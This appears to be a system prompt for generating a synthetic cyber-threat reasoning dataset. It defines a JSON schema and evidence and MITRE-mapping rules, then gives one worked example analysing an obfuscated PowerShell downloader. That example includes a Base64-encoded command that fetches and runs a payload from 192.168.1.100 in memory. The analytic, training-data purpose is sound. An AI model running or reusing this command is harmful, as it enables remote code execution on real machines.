[SYSTEM]
CURRENT TASK: Structured Reasoning Dataset Generation (Chain of Thought Schema)

REQUIRED JSON KEYS:
{
  "instruction":  "<analyst question requiring step-by-step reasoning to answer>",
  "input":        "<the source content being analyzed: code, report excerpt, or tool output>",
  "reasoning":    "<numbered step-by-step expert deduction — show your analytical process>",
  "answer":       "<final precise conclusion — self-contained, technically correct>",
  "task_type":    "<malware_analysis|threat_intel|vulnerability|incident_response|cti_qa|general_cyber>"
}

SCHEMA SPECIFIC RULES:
- Reasoning Quality: Each step must advance the analysis. Show HOW you arrive at the conclusion (e.g., "Line 3 calls VirtualAlloc with 0x40 = PAGE_EXECUTE_READWRITE, indicating shellcode staging").
- Evidence Grounding: You MUST quote exact tokens, IPs, or variable names from the input in your reasoning and evidence fields using [EVIDENCE: 'exact quote'].
- Constraint Adherence: You MUST strictly follow the rules in the [CONSTRAINTS] block. Do NOT hallucinate CVEs, MITRE IDs, or IPs if prohibited.
- MITRE Mapping in Reasoning: When you identify a MITRE technique, name it in the reasoning step with justification ("This maps to T1055.001 because...").
- Answer: Must be the precise final conclusion, without repeating all the reasoning steps.

[FEW_SHOT]
FORMAT EXAMPLE:
{"instruction":"Analyze this PowerShell command for its evasion technique and map it to MITRE ATT&CK.","input":"powershell -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEALgAxADAAMAAvAHAAYQB5AGwAbwBhAGQAJwApAA==","reasoning":"1. The command uses 'powershell -nop -w hidden' — this disables the profile (-nop) and hides the window (-w hidden) to avoid user detection.\n2. The '-enc' flag indicates the subsequent argument is a Base64-encoded command.\n3. Decoding the Base64 string yields: IEX (New-Object Net.WebClient).downloadstring('http://192.168.1.100/payload')\n4. 'IEX' (Invoke-Expression) executes the downloaded string directly in memory without writing to disk.\n5. 'Net.WebClient.DownloadString' downloads content from http://192.168.1.100/payload — this IP is an IOC.\n6. MITRE Mapping: The -enc evasion maps to T1027 (Obfuscated Files or Information). The IEX execution maps to T1059.001 (PowerShell). The download-and-execute pattern maps to T1105 (Ingress Tool Transfer).","answer":"This command is an obfuscated PowerShell downloader (T1059.001 + T1027 + T1105). It downloads and immediately executes a remote payload from 192.168.1.100 in-memory using IEX, bypassing disk-based AV. The IOC is the C2 IP: 192.168.1.100.","task_type":"malware_analysis"}
